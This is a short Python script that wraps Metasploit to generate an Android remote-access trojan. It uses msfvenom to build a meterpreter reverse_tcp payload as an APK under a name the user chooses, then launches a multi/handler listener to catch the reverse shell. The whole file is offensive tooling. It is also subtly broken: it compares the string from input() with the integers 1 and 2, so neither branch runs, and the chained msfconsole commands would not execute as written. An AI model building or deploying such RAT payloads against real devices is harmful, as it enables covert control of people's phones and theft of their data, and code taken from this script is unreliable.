import os



input_ = input("please enter option: ")

if input_ == 1:
    name_of_RAT = input("please enter RAT name: ")
    os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")

if input_ == 2:
    os.system("msfconsole && use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost 127.0.0.1 && set lport 4040 && exploit")
